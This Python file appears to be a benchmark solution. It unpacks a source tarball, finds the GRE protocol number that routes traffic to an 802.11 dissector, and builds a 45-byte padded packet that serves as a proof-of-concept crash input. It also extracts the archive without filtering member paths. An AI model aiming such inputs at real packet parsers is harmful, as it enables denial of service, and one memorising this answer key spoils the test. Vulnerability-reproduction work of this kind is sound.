import tarfile
import re
import os
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        extract_dir = './temp_extract'
        proto_id = None
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(path=extract_dir)
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    if file.endswith('.c') and ('ieee80211' in file.lower() or '80211' in file.lower() or 'gre' in file.lower()):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            match = re.search(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([0-9a-fA-Fx]+)\s*,\s*ieee80211', content)
                            if match:
                                proto_str = match.group(1).lstrip('0x')
                                proto_id = int(proto_str, 16)
                                break
                if proto_id is not None:
                    break
            if proto_id is None:
                proto_id = 0  # fallback, should not happen
            gre_header = b'\x00\x00' + proto_id.to_bytes(2, 'big')
            poc = gre_header + b'A' * (45 - 4)
            return poc
        finally:
            if os.path.exists(extract_dir):
                shutil.rmtree(extract_dir)
